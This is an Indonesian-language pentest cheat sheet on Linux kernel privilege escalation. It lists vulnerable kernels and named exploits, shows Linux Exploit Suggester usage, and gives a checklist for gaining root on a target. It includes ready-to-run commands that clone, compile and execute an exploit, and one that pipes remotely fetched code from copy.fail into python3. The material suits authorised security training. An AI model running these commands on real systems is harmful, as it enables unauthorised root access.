# 🚀 Kernel Local Privilege Escalation (Kernel LPE)

> **Tujuan:** Mengeksploitasi kerentanan pada kernel Linux untuk naik dari user terbatas menjadi **root**.

---

## 📌 Penjelasan Singkat

Kernel LPE memanfaatkan celah pada **kernel space** (memori, modul, atau syscall) yang memungkinkan user biasa mengeksekusi code sebagai **root**. Eksploit kernel yang berhasil biasanya langsung menganugerahkan **uid=0** tanpa memerlukan password.

---

## 🧪 Deteksi Versi Kernel

```bash
uname -r
cat /etc/os-release
```

| Kernel | Vulnerable |
|--------|-----------|
| Ubuntu 5.15.0‑XXX (XXX < 181) | dirtyfrag (CVE‑2026‑43284/43500) + copyfail (CVE‑2026‑31431) |
| Debian 5.10.0‑9 | DirtyPipe (CVE‑2022‑0847) + copyfail subset |

---

## 🧨 Exploit Populer

### 1️⃣ DirtyFrag (CVE‑2026‑43284 / 43500)

```bash
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && \
gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```

> Butuh modul `esp4`/`esp6`/`rxrpc`. Cek dengan `lsmod` atau `modinfo`.

### 2️⃣ CopyFail (CVE‑2026‑31431)

```bash
curl https://copy.fail/exp | python3 && su
```

### 3️⃣ DirtyPipe (CVE‑2022‑0847)

> Vulnerability pada Linux kernel yang memungkinkan **privilege escalation** pada kernel terdampak.

### 4️⃣ DirtyCOW

> Kernel lama yang berkaitan dengan **race condition** pada mekanisme copy‑on‑write.

### 5️⃣ PwnKit (CVE‑2021‑4034)

> LPE pada `pkexec`/`polkit`.

---

## 🤖 Linux Exploit Suggester (LES)

Tool otomatis untuk mencocokkan kernel dengan CVE yang relevan.

### Sumber
- [The‑Z‑Labs/linux‑exploit‑suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [jondonas/linux‑exploit‑suggester‑2](https://github.com/jondonas/linux-exploit-suggester-2) (Perl)

### Cara Pakai

```bash
# Ambil kernel version dari target
uname -r

# Jalankan LES di Kali
./linux-exploit-suggester.sh --kernel <KERNEL_VERSION>
```

### Contoh Output

```text
Kernel version: 5.15.0-123-generic
[CVE-2026-43284] highly probable   (DirtyFrag)
[CVE-2026-31431] highly probable   (CopyFail)
[CVE-2022-0847] probable           (DirtyPipe)
```

> **Fokus:** hasil `highly probable` terlebih dahulu.

---

## 🪜 Langkah Umum (Cross‑Check)

```text
1. Deteksi kernel
   → uname -r
2. Ambil PoC publik
   → Repository / situs resmi / searchsploit
3. Compile di target
   → gcc
   ATAU
   → Transfer binary yang sesuai GLIBC
4. Jalankan PoC
   → Uji apakah LPE berhasil
5. Verifikasi
   → id
   → uid/euid=0 berarti root
```

---

## 🔧 Quick Enumeration

```bash
uname -r
cat /etc/os-release
id
sudo -l
lsmod
modinfo <MODULE>
```

---

## ✅ Verifikasi Root

```bash
id
# uid=0(root) euid=0(root) groups=0(root)
```

> ⚠️ **Catatan:** Kernel LPE **hanya boleh diuji pada sistem yang Anda miliki atau yang secara eksplisit diizinkan untuk pengujian keamanan**.

---

## 📋 Checklist Kernel LPE

- [ ] Dapatkan versi kernel (`uname -r`).
- [ ] Jalankan Linux Exploit Suggester (LES).
- [ ] Pilih PoC `highly probable` (DirtyFrag / CopyFail / DirtyPipe / PwnKit / DirtyCOW).
- [ ] Clone / upload PoC ke target.
- [ ] Compile (jika belum dikompilasi) atau transfer binary yang sesuai GLIBC.
- [ ] Jalankan exploit.
- [ ] Verifikasi root (`id` → `uid=0`).

---

## 📚 Referensi

- [Kernel Exploit Suggester – The‑Z‑Labs](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [Kernel Exploit Suggester 2 – jondonas](https://github.com/jondonas/linux-exploit-suggester-2)
- [GTFOBins – Unix binaries privilege escalation](https://gtfobins.github.io)
- [OWASP – Local Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
